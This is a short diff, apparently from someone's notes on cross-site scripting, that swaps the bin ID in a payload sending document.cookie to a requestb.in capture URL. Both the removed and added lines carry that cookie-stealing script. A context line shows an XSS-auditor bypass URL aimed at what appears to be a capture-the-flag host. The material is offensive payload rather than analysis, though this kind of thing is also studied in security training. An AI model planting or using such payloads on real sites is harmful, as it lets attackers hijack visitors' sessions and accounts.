@@ -10,4 +10,4 @@ https://cve.mitre.org
 
 https://uw2017.p4.team/bypassing-xss-auditor?debug=1&adb=<script>alert(%27Hello%27);"\&abd2="</script>
 
-<script>document.createElement("img").src="http://requestb.in/11t75fd1" + document.cookie</script>
+<script>document.createElement("img").src="http://requestb.in/158azuq1" + document.cookie</script>
